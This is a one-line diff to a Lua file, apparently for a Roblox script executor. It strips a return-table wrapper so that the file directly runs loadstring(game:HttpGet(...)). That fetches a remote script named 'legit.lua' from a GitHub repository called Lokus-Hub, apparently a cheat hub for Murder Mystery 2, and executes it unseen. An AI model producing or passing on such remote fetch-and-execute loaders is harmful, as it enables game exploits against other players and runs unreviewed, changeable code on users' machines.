@@ -1,3 +1,1 @@
-return {
 loadstring(game:HttpGet("https://raw.githubusercontent.com/MM2-ScriptsZ/Lokus-Hub/refs/heads/main/legit.lua"))()
-}
